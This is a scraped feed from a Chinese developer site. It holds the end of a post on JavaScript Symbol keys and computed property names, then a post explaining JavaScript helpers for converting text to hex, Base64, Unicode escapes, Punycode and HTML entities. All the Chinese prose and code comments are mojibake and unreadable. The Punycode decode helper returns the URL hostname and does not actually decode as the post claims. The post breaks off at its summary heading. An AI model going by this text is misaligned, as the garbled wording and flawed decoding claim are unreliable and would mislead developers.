<table><thead><tr><th>å†™æ³•</th><th>JS å¦‚ä½•è§£æ</th><th>å®é™…åˆ›å»ºçš„é”®</th><th>æ˜¯å¦è®¿é—®åˆ°<code>'123'</code>ï¼Ÿ</th></tr></thead><tbody><tr><td><code>{ secret: '123' }</code></td><td>å°†Â <code>secret</code>Â è§†ä¸º<strong>å­—é¢é‡æ ‡è¯†ç¬¦</strong>Â â†’ è‡ªåŠ¨è½¬ä¸ºå­—ç¬¦ä¸²Â <code>'secret'</code></td><td>å­—ç¬¦ä¸²Â <code>'secret'</code></td><td><code>user1.secret</code>Â âœ… â†’Â <code>'123'</code> <code>user1[secret]</code>Â âŒ â†’Â <code>undefined</code></td></tr><tr><td><code>{ [secret]: '123' }</code></td><td>æ–¹æ‹¬å·è§¦å‘<strong>è®¡ç®—å±æ€§åï¼ˆComputed Property Nameï¼‰</strong> Â â†’ å…ˆæ±‚å€¼Â <code>secret</code>Â å˜é‡ â†’ å¾—åˆ°Â <code>Symbol('password')</code></td><td><code>Symbol('password')</code></td><td><code>user2[secret]</code>Â âœ… â†’Â <code>'123'</code> <code>user2.secret</code>Â âŒ â†’Â <code>undefined</code>ï¼ˆæ— å­—ç¬¦ä¸²é”®Â <code>'secret'</code>ï¼‰</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡Â <strong>å…³é”®ç»“è®º</strong>ï¼š</p>
<ul>
<li><code>.</code>Â å’ŒÂ <code>{ key: }</code>Â ä¸­çš„Â <code>key</code>Â <strong>æ°¸è¿œåªè®¤å­—ç¬¦ä¸²å­—é¢é‡</strong>ï¼›</li>
<li><code>[ ]</code>Â æ˜¯ JS ä¸­<strong>å”¯ä¸€èƒ½å°†å˜é‡ã€è¡¨è¾¾å¼ã€Symbol åŠ¨æ€æ³¨å…¥ä¸ºå±æ€§åçš„è¯­æ³•</strong>ï¼›</li>
<li>å› æ­¤ï¼š <strong><code>[secret]</code>Â ä¸æ˜¯â€œä¸€ç§å†™æ³•â€ï¼Œè€Œæ˜¯ä½¿ç”¨ Symbol ä½œé”®çš„å¼ºåˆ¶è¯­æ³•è¦æ±‚ã€‚</strong></li>
</ul>
</blockquote>
<h4 data-id="heading-13">ğŸ§© ç±»æ¯”åŠ©è®°ï¼ˆæ¥è‡ªä»£ç çš„åœºæ™¯ï¼‰</h4>
<blockquote>
<p>æƒ³è±¡Â <code>secret</code>Â æ˜¯ä¸€æŠŠ<strong>å®šåˆ¶æŒ‡çº¹é”çš„æ¨¡å…·</strong>ï¼š</p>
<ul>
<li><code>{ secret: ... }</code>Â â†’ ç›¸å½“äºåœ¨é—¨ä¸Šè´´äº†å¼ çº¸æ¡ï¼Œå†™ç€â€œsecretâ€äºŒå­—ï¼ˆä»»ä½•äººéƒ½èƒ½çœ‹è§ã€ä¿®æ”¹ï¼‰ï¼›</li>
<li><code>{ [secret]: ... }</code>Â â†’ æŠŠæ¨¡å…·æŒ‰åœ¨é—¨ä¸Šï¼Œ<strong>ç”Ÿæˆä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„ç‰©ç†é”å­”</strong>ï¼Œåªæœ‰åŒä¸€æ¨¡å…·ï¼ˆå³åŒä¸€ä¸ªÂ <code>secret</code>Â å˜é‡ï¼‰æ‰èƒ½æ‰“å¼€ã€‚</li>
</ul>
<p>æ‰€ä»¥ï¼š<strong>æ²¡æœ‰Â <code>[ ]</code>ï¼Œå°±æ²¡æœ‰ Symbol é”®ï¼›æ²¡æœ‰ Symbol é”®ï¼Œå°±æ²¡æœ‰å‘½åéš”ç¦»ä¸å®‰å…¨é˜²æŠ¤ã€‚</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ–‡æœ¬ç¼–ç è½¬æ¢å™¨æ ¸å¿ƒJSå®ç°]]></title>    <link>https://juejin.cn/post/7600837236621230132</link>    <guid>https://juejin.cn/post/7600837236621230132</guid>    <pubDate>2026-01-30T14:18:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600837236621230132" data-draft-id="7600976289063976960" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ–‡æœ¬ç¼–ç è½¬æ¢å™¨æ ¸å¿ƒJSå®ç°"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-30T14:18:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ»•é’å±±"/> <meta itemprop="url" content="https://juejin.cn/user/3206601805674094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ–‡æœ¬ç¼–ç è½¬æ¢å™¨æ ¸å¿ƒJSå®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3206601805674094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ»•é’å±±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T14:18:35.000Z" title="Fri Jan 30 2026 14:18:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å·¥å…·ç½‘å€å’Œæˆªå›¾</h2>
<blockquote>
<p>åœ¨çº¿å·¥å…·ç½‘å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fsee-tool.com%2Fencoding-converter" target="_blank" title="https://see-tool.com/encoding-converter" ref="nofollow noopener noreferrer">see-tool.com/encoding-coâ€¦</a></p>
</blockquote>
<blockquote>
<p>å·¥å…·æˆªå›¾ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d20a3b702b94741b4dcfc6c38126d99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ruV6Z2S5bGx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770387515&amp;x-signature=hllfa2i6gXN7bVSbyQfzA7P%2Bbko%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
</blockquote>
<h2 data-id="heading-1">æ–‡æœ¬ç¼–ç è½¬æ¢å™¨åŠŸèƒ½æ ¸å¿ƒå®ç°è§£æ</h2>
<p>æœ¬æ–‡å°†æ·±å…¥æ¢è®¨æ–‡æœ¬ç¼–ç è½¬æ¢å™¨ï¼ˆText Encoding Converterï¼‰çš„æ ¸å¿ƒ JavaScript å®ç°é€»è¾‘ã€‚è¯¥å·¥å…·æ—¨åœ¨å®ç°æ™®é€šæ–‡æœ¬ä¸å¤šç§ç¼–ç æ ¼å¼ï¼ˆå¦‚åå…­è¿›åˆ¶ã€äºŒè¿›åˆ¶ã€Base64ã€Unicode ç­‰ï¼‰ä¹‹é—´çš„ç›¸äº’è½¬æ¢ã€‚</p>
<h3 data-id="heading-2">1. æ ¸å¿ƒè½¬æ¢æœºåˆ¶</h3>
<p>æ•´ä¸ªå·¥å…·çš„è½¬æ¢é€»è¾‘åŸºäºä¸€ä¸ªç»Ÿä¸€çš„å…¥å£å‡½æ•° <code>convert</code>ï¼Œå®ƒæ ¹æ®è¾“å…¥å’Œè¾“å‡ºæ ¼å¼ï¼Œé€šè¿‡æŸ¥æ‰¾è¡¨ï¼ˆLookup Tableï¼‰è°ƒç”¨ç›¸åº”çš„è½¬æ¢å‡½æ•°ã€‚</p>
<p>æ ¸å¿ƒçš„å­—èŠ‚å¤„ç†ä¾èµ–äºæµè§ˆå™¨åŸç”Ÿçš„ <code>TextEncoder</code> å’Œ <code>TextDecoder</code> APIï¼Œè¿™ç¡®ä¿äº†å¯¹ UTF-8 çš„æ­£ç¡®å¤„ç†ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å­—ç¬¦ä¸²è½¬å­—èŠ‚æ•°ç»„</span>
<span class="hljs-keyword">const</span> encoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>();
<span class="hljs-keyword">const</span> bytes = encoder.<span class="hljs-title function_">encode</span>(text);

<span class="hljs-comment">// å­—èŠ‚æ•°ç»„è½¬å­—ç¬¦ä¸²</span>
<span class="hljs-keyword">const</span> decoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextDecoder</span>(<span class="hljs-string">'utf-8'</span>);
<span class="hljs-keyword">const</span> text = decoder.<span class="hljs-title function_">decode</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(bytes));
</code></pre>
<h3 data-id="heading-3">2. æ ¼å¼è½¬æ¢å®ç°ç»†èŠ‚</h3>
<h4 data-id="heading-4">2.1 è¿›åˆ¶è½¬æ¢ (Hex, Binary, Octal, Decimal)</h4>
<p>å¯¹äºäºŒè¿›åˆ¶ã€å…«è¿›åˆ¶ã€åå…­è¿›åˆ¶ç­‰æ•°å­—æ ¼å¼ï¼Œæ ¸å¿ƒæ€è·¯æ˜¯å°†æ–‡æœ¬è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ï¼Œç„¶ååˆ©ç”¨ <code>Number.prototype.toString(radix)</code> å°†æ¯ä¸ªå­—èŠ‚è½¬æ¢ä¸ºå¯¹åº”çš„è¿›åˆ¶å­—ç¬¦ä¸²ã€‚</p>
<p>ä»¥**Hexï¼ˆåå…­è¿›åˆ¶ï¼‰**ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">textToHex</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">text, delimiter, prefix, uppercase</span>) {
    <span class="hljs-keyword">const</span> encoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>();
    <span class="hljs-keyword">const</span> bytes = encoder.<span class="hljs-title function_">encode</span>(text);
    <span class="hljs-keyword">let</span> hex = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(bytes).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> {
        <span class="hljs-comment">// æ¯ä¸ªå­—èŠ‚è½¬16è¿›åˆ¶ï¼Œå¹¶è¡¥é½2ä½</span>
        <span class="hljs-keyword">let</span> h = b.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
        <span class="hljs-keyword">if</span> (uppercase) h = h.<span class="hljs-title function_">toUpperCase</span>();
        <span class="hljs-keyword">return</span> prefix + h;
    });
    <span class="hljs-keyword">return</span> hex.<span class="hljs-title function_">join</span>(delimiter);
}
</code></pre>
<p>åå‘è½¬æ¢åˆ™æ˜¯ç§»é™¤å‰ç¼€å’Œåˆ†éš”ç¬¦åï¼Œä½¿ç”¨ <code>parseInt(chunk, 16)</code> è¿˜åŸå­—èŠ‚ã€‚</p>
<h4 data-id="heading-5">2.2 Base64 ç¼–ç </h4>
<p>JavaScript åŸç”Ÿçš„ <code>btoa</code> å’Œ <code>atob</code> å‡½æ•°åªèƒ½å¤„ç† ASCII å­—ç¬¦ã€‚ä¸ºäº†æ”¯æŒä¸­æ–‡ç­‰ Unicode å­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå¯¹å­—ç¬¦ä¸²è¿›è¡Œç¼–ç å¤„ç†ã€‚</p>
<p><strong>æ–‡æœ¬è½¬ Base64</strong> çš„å¥å£®å®ç°ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">textToBase64</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">text</span>) {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// æ–¹æ³•1: ä½¿ç”¨ TextEncoder è·å–å­—èŠ‚ï¼Œæ„é€ äºŒè¿›åˆ¶å­—ç¬¦ä¸²</span>
        <span class="hljs-keyword">const</span> encoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>();
        <span class="hljs-keyword">const</span> bytes = encoder.<span class="hljs-title function_">encode</span>(text);
        <span class="hljs-keyword">let</span> binary = <span class="hljs-string">''</span>;
        bytes.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">byte</span> =&gt;</span> binary += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(byte));
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">btoa</span>(binary);
    } <span class="hljs-keyword">catch</span> (e) {
        <span class="hljs-comment">// æ–¹æ³•2: é™çº§æ–¹æ¡ˆï¼Œä½¿ç”¨ encodeURIComponent å¤„ç†</span>
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">btoa</span>(<span class="hljs-built_in">unescape</span>(<span class="hljs-built_in">encodeURIComponent</span>(text)));
    }
}
</code></pre>
<p><strong>Base64 è½¬æ–‡æœ¬</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">base64ToText</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">base64</span>) {
    <span class="hljs-keyword">const</span> binary = <span class="hljs-title function_">atob</span>(base64.<span class="hljs-title function_">trim</span>());
    <span class="hljs-keyword">const</span> bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(binary.<span class="hljs-property">length</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; binary.<span class="hljs-property">length</span>; i++) {
        bytes[i] = binary.<span class="hljs-title function_">charCodeAt</span>(i);
    }
    <span class="hljs-keyword">const</span> decoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextDecoder</span>(<span class="hljs-string">'utf-8'</span>);
    <span class="hljs-keyword">return</span> decoder.<span class="hljs-title function_">decode</span>(bytes);
}
</code></pre>
<h4 data-id="heading-6">2.3 Unicode è½¬ä¹‰ä¸ç ç‚¹</h4>
<p>å¤„ç† Unicode è½¬ä¹‰ï¼ˆå¦‚ <code>\u4E2D</code>ï¼‰æ—¶ï¼Œå…³é”®åœ¨äºæ­£ç¡®å¤„ç†<strong>ä»£ç†å¯¹ï¼ˆSurrogate Pairsï¼‰</strong>ã€‚å¯¹äºè¶…å‡ºåŸºæœ¬å¤šæ–‡ç§å¹³é¢ï¼ˆBMP, U+0000 åˆ° U+FFFFï¼‰çš„å­—ç¬¦ï¼ˆä¾‹å¦‚ Emojiï¼‰ï¼ŒJavaScript çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º 2ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨ <code>codePointAt(0)</code> æ¥è·å–å®Œæ•´çš„ç ç‚¹å€¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">textToUnicodeEscape</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">text, delimiter, uppercase</span>) {
    <span class="hljs-keyword">let</span> result = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> char <span class="hljs-keyword">of</span> text) {
        <span class="hljs-keyword">let</span> code = char.<span class="hljs-title function_">codePointAt</span>(<span class="hljs-number">0</span>);
        <span class="hljs-comment">// å¦‚æœç ç‚¹è¶…è¿‡ 0xFFFFï¼Œè¯´æ˜æ˜¯ä»£ç†å¯¹ï¼ŒJS ä¼šå°†å…¶è§†ä¸ºä¸¤ä¸ªå­—ç¬¦</span>
        <span class="hljs-keyword">if</span> (code &gt; <span class="hljs-number">0xFFFF</span>) {
            <span class="hljs-comment">// æ‰‹åŠ¨è®¡ç®—ä»£ç†å¯¹ï¼ˆè™½ç„¶ ES6 for-of å¾ªç¯ä¼šè‡ªåŠ¨æ­£ç¡®è¿­ä»£å­—ç¬¦ï¼‰</span>
            <span class="hljs-keyword">const</span> high = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((code - <span class="hljs-number">0x10000</span>) / <span class="hljs-number">0x400</span>) + <span class="hljs-number">0xD800</span>;
            <span class="hljs-keyword">const</span> low = (code - <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x400</span> + <span class="hljs-number">0xDC00</span>;
            <span class="hljs-comment">// ... è½¬æ¢ä¸º \uXXXX\uXXXX æ ¼å¼</span>
            <span class="hljs-keyword">let</span> h1 = high.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">4</span>, <span class="hljs-string">'0'</span>);
            <span class="hljs-keyword">let</span> h2 = low.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">4</span>, <span class="hljs-string">'0'</span>);
            result.<span class="hljs-title function_">push</span>(<span class="hljs-string">'\\u'</span> + h1);
            result.<span class="hljs-title function_">push</span>(<span class="hljs-string">'\\u'</span> + h2);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// ... æ™®é€šå­—ç¬¦è½¬æ¢ä¸º \uXXXX</span>
            <span class="hljs-keyword">let</span> h = code.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">4</span>, <span class="hljs-string">'0'</span>);
            result.<span class="hljs-title function_">push</span>(<span class="hljs-string">'\\u'</span> + h);
        }
    }
    <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">join</span>(delimiter);
}
</code></pre>
<p>æ³¨æ„ï¼šä½¿ç”¨ <code>for...of</code> å¾ªç¯å¯ä»¥æ­£ç¡®éå†å­—ç¬¦ä¸²ä¸­çš„ Emoji ç­‰å®½å­—ç¬¦ï¼Œè€Œæ™®é€šçš„ <code>for(let i=0;...)</code> åˆ™ä¼šæŠŠå®ƒä»¬æ‹†åˆ†æˆä¸¤ä¸ªã€‚</p>
<h4 data-id="heading-7">2.4 Punycode è½¬æ¢</h4>
<p>Punycode æ˜¯å›½é™…åŒ–åŸŸåï¼ˆIDNï¼‰ä½¿ç”¨çš„ç¼–ç ã€‚æœ¬é¡¹ç›®é‡‡ç”¨äº†ä¸€ä¸ªå·§å¦™çš„åˆ©ç”¨æµè§ˆå™¨åŸç”Ÿ API çš„æ–¹æ³•ï¼Œé¿å…å¼•å…¥åºå¤§çš„ç¬¬ä¸‰æ–¹åº“ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">punycode</span>: {
    <span class="hljs-attr">encode</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">input</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// åˆ©ç”¨ URL API è‡ªåŠ¨è¿›è¡Œ Punycode ç¼–ç </span>
            <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'http://'</span> + input);
            <span class="hljs-keyword">return</span> url.<span class="hljs-property">hostname</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^xn--/</span>, <span class="hljs-string">''</span>);
        } <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-comment">// é™çº§å¤„ç†...</span>
        }
    },
    <span class="hljs-attr">decode</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">input</span>) {
        <span class="hljs-comment">// åˆ©ç”¨ URL API è‡ªåŠ¨è§£æ</span>
        <span class="hljs-keyword">const</span> testUrl = <span class="hljs-string">'http://'</span> + input;
        <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(testUrl);
        <span class="hljs-keyword">return</span> url.<span class="hljs-property">hostname</span>;
    }
}
</code></pre>
<p>è¿™æ˜¯ä¸€ä¸ªéå¸¸è½»é‡ä¸”é«˜æ•ˆçš„å®ç°æ–¹å¼ã€‚</p>
<h4 data-id="heading-8">2.5 HTML å®ä½“</h4>
<p>HTML å®ä½“çš„è½¬æ¢ç›¸å¯¹ç›´æ¥ï¼Œä¸»è¦å°†å­—ç¬¦è½¬æ¢ä¸ºå…¶å¯¹åº”çš„åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶å¼•ç”¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">textToHtmlDecimal</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">text, delimiter</span>) {
    <span class="hljs-keyword">let</span> result = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> char <span class="hljs-keyword">of</span> text) {
        <span class="hljs-keyword">let</span> code = char.<span class="hljs-title function_">codePointAt</span>(<span class="hljs-number">0</span>);
        result.<span class="hljs-title function_">push</span>(<span class="hljs-string">'&amp;#'</span> + code + <span class="hljs-string">';'</span>);
    }
    <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">join</span>(delimiter);
}
</code></pre>
<h3 data-id="heading-9">3. å­—ç¬¦è¯¦æƒ…åˆ†æ</h3>
<p>å·¥å…·è¿˜æä¾›äº†ä¸€ä¸ª <code>getCharacterInfo</code> å‡½æ•°ï¼Œç”¨äºåˆ†æå•ä¸ªå­—ç¬¦çš„è¯¦ç»†ä¿¡æ¯ã€‚å®ƒä¸ä»…è¿”å›å­—ç¬¦æœ¬èº«ï¼Œè¿˜è®¡ç®—å…¶ Unicode ç ç‚¹ã€UTF-8 å­—èŠ‚åºåˆ—ç­‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getCharacterInfo</span>(<span class="hljs-params">char</span>) {
    <span class="hljs-keyword">const</span> codePoint = char.<span class="hljs-title function_">codePointAt</span>(<span class="hljs-number">0</span>);
    <span class="hljs-keyword">const</span> encoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>();
    <span class="hljs-keyword">const</span> utf8Bytes = encoder.<span class="hljs-title function_">encode</span>(char);
    
    <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">char</span>: char,
        <span class="hljs-attr">codePoint</span>: codePoint, <span class="hljs-comment">// æ•°å­—å½¢å¼</span>
        <span class="hljs-attr">hex</span>: codePoint.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toUpperCase</span>(), <span class="hljs-comment">// Hex å½¢å¼</span>
        <span class="hljs-attr">utf8</span>: <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(utf8Bytes) <span class="hljs-comment">// UTF-8 å­—èŠ‚åºåˆ—</span>
              .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toUpperCase</span>().<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>))
              .<span class="hljs-title function_">join</span>(<span class="hljs-string">' '</span>)
    };
}
</code></pre>
<h3 data-id="heading-10">æ€»ç»“</h3>
